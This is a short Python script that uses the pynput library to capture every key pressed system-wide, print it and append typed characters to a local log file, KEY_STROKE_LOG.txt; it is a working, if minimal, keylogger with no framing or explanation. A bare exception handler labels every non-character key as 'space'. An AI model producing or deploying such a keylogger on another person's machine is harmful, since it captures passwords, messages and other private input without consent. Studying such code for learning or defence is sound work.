
from pynput import keyboard


def keystrokes(key):
    print(str(key))
    with open("KEY_STROKE_LOG.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("space")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keystrokes)
    listener.start()
    input()
